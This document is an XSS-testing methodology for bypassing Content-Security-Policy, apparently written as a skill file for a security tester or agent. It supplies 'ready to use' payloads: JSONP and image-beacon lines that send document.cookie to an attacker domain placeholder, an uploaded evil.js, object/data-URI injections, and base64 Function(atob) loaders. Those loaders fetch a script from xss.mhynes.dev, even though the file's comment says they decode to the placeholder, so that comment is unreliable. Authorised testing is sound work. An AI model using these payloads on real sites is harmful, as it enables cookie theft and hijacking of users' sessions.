# CSP Analysis and Bypass Methodology

Companion to `SKILL.md`. Use when `Content-Security-Policy` is present and basic XSS payloads are blocked by the browser.

Source notes:
- `/home/gg/notes/INFOSEC/CWEE/Advanced XSS and CSRF Exploitation/Content Security Policy (CSP) 343c73a5166880eda391da2374f60f26.md`
- `/home/gg/notes/INFOSEC/CWEE/Advanced XSS and CSRF Exploitation/Bypassing Weak CSPs 255c73a51668806c9858f4a0d6d7d17b.md`
- `/home/gg/notes/INFOSEC/CWEE/Advanced XSS and CSRF Exploitation/Cheatsheet 344c73a516688048879afad790aa2d7a.md`

---

## Step 1 — Capture the CSP

```
Response header: Content-Security-Policy: <value>
```

Also check: `Content-Security-Policy-Report-Only` (same syntax, non-enforced — notes the intended policy).

---

## Step 2 — Parse key directives

| Directive | Controls |
|---|---|
| `script-src` | Where JS can load/execute from |
| `default-src` | Fallback for any directive not explicitly set |
| `connect-src` | XHR/fetch/WebSocket destinations |
| `img-src` | Image sources (used for beacon exfil) |
| `object-src` | `<object>`, `<embed>` elements |
| `frame-ancestors` | Who can iframe this page (anti-clickjack) |
| `form-action` | Where forms can submit |

**Critical values:**

| Value | Meaning |
|---|---|
| `'unsafe-inline'` | Inline scripts/handlers allowed → basic payloads work |
| `'unsafe-eval'` | `eval()` / `Function()` allowed |
| `'self'` | Origin only — see bypass vectors below |
| `*` (wildcard) | Any origin allowed |
| `nonce-<value>` | Script must have matching `nonce` attribute |
| `sha256-<hash>` | Script must hash-match exactly |
| `'none'` | Nothing allowed |

---

## Step 3 — Run through CSP Evaluator

Paste the full CSP at: **https://csp-evaluator.withgoogle.com/**

---

## Step 4 — Identify bypass vectors

### 4.1 `unsafe-inline` present

Inline scripts fully work. No bypass needed:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### 4.2 `unsafe-eval` present

Encoding-based eval payloads work. Load exfil scripts via eval if `unsafe-inline` is absent:
```js
eval(atob("YWxlcnQoMSk="))
Function(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8veHNzLm1oeW5lcy5kZXYvZXhwbG9pdCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs="))()
```

### 4.3 Allowlisted JSONP-capable host (most common real-world bypass)

If `script-src` allows a domain that has a JSONP endpoint, you can force arbitrary JS execution via the `callback` parameter.

**Google — confirmed JSONP endpoints:**
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
<script src="https://accounts.google.com/o/oauth2/token?callback=alert(1);"></script>
```

**Full JSONP endpoint list:** https://github.com/zigoo0/JSONBee

**How to find JSONP endpoints on an allowlisted domain:**
1. Browse the domain's API docs / public endpoints
2. Try appending `?callback=test` to any endpoint that returns JSON
3. If response body changes to `test({...})` — it's JSONP

### 4.4 `'self'` + file upload allowed

If `script-src 'self'` and the app allows file uploads:

1. Upload a `.js` file (or any file with `Content-Type: application/javascript`)
2. Note the hosted URL (e.g. `/uploads/avatar.jpg.js`)
3. Load it as a same-origin script:
```html
<script src="/uploads/avatar.jpg.js"></script>
```

The upload filename or MIME type bypass depends on how the app handles the upload — try `.js`, `.mjs`, name it `.jpg` if extension-renamed but content-type stays `application/javascript`.

### 4.5 Missing `object-src` directive

If `object-src` is not set and `default-src` is not `'none'`, `<object>` and `<embed>` may not be restricted:
```html
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 4.6 Missing `connect-src` — use image beacon for exfil

If `connect-src` blocks `fetch()`/XHR to your server but `img-src` is looser (or missing, falling back to `default-src *`):
```js
new Image().src = 'YOUR_EZXSS_DOMAIN/log?c=' + btoa(document.cookie);
```

### 4.7 Subdomain wildcard of a common platform

If `script-src *.somecdn.com` — check if any `somecdn.com` subdomain allows user-controlled content. If you can upload JS there, you can serve it and the CSP trusts it.

### 4.8 Nonce/hash-based CSP

If the CSP uses `nonce-<value>` or `sha256-<hash>`:
- **Nonce:** the nonce must be unique per response. If the nonce is static (always the same value) — the CSP is effectively bypassable:
  ```html
  <script nonce="SAME_STATIC_NONCE">alert(1)</script>
  ```
- **Hash:** only the exact whitelisted script can run. No general bypass unless you can inject into an existing whitelisted script context (rare).

### 4.9 `frame-ancestors` missing or `'*'`

While not directly an XSS bypass, missing `frame-ancestors` enables clickjacking. If exploiting clickjacking + XSS chain:
```html
<iframe src="https://target.tld/page" style="opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
```

---

## Step 5 — CSP bypass payloads (ready to use)

### Google JSONP (for `script-src *.google.com` or `*.googleapis.com`)
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
<script src="https://accounts.google.com/o/oauth2/revoke?callback=fetch('YOUR_EZXSS_DOMAIN/log?c='+btoa(document.cookie))"></script>
```

### Load remote script via base64 atob (when `unsafe-eval` present, `unsafe-inline` blocked)
```html
<svg onload=Function(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8veHNzLm1oeW5lcy5kZXYvZXhwbG9pdCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs='))()>
```
(The base64 decodes to: `var s=document.createElement('script');s.src='YOUR_EZXSS_DOMAIN/exploit';document.body.appendChild(s);`)

### Image beacon (when `connect-src` blocked, `img-src *` or `img-src https:`)
```html
<img src=x onerror="new Image().src='YOUR_EZXSS_DOMAIN/log?c='+btoa(document.cookie)">
```

### File-upload bypass skeleton
```bash
# Create the payload JS file
echo "fetch('YOUR_EZXSS_DOMAIN/log?c='+btoa(document.cookie))" > evil.js

# Upload it to the target (via normal file upload functionality)
# Then inject:
<script src="/uploads/[filename]"></script>
```

---

## Strict CSP analysis example (known-secure baseline)

```
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

Against this CSP:
- No inline scripts → `<script>alert(1)</script>` blocked
- `script-src 'self'` only → external script loads blocked
- **Bypass route:** look for file upload that lands on same origin + allows arbitrary content-type. If found → upload JS → `<script src=/uploads/...>` works.
- If no file upload → practically blocked for non-JSONP approaches.

---

## CSP bypass decision tree

```
Is unsafe-inline in script-src?
  YES → Inline payloads work. Done.
  NO ↓

Is unsafe-eval in script-src?
  YES → eval(atob(...)) payloads work. Load remote script via eval.
  NO ↓

Does script-src allowlist a domain with JSONP endpoints?
  YES → Use JSONBee / Google JSONP. Done.
  NO ↓

Is 'self' in script-src AND file upload to same origin exists?
  YES → Upload JS file, load via <script src=/uploads/...>. Done.
  NO ↓

Is object-src missing or permissive?
  YES → Try <object data="javascript:alert(1)"> or <object data="data:text/html,...">
  NO ↓

Is connect-src missing/permissive but img-src permissive?
  YES → Exfil via Image beacon new Image().src=...
  NO ↓

Are nonces static (same value on every page load)?
  YES → Replay the nonce in <script nonce=VALUE>
  NO ↓

→ CSP effectively blocks XSS. Report injection point as information disclosure / CSP bypass research needed.
   Note the exact CSP in your report — a strong CSP is still a positive finding even if you can't bypass it.
```
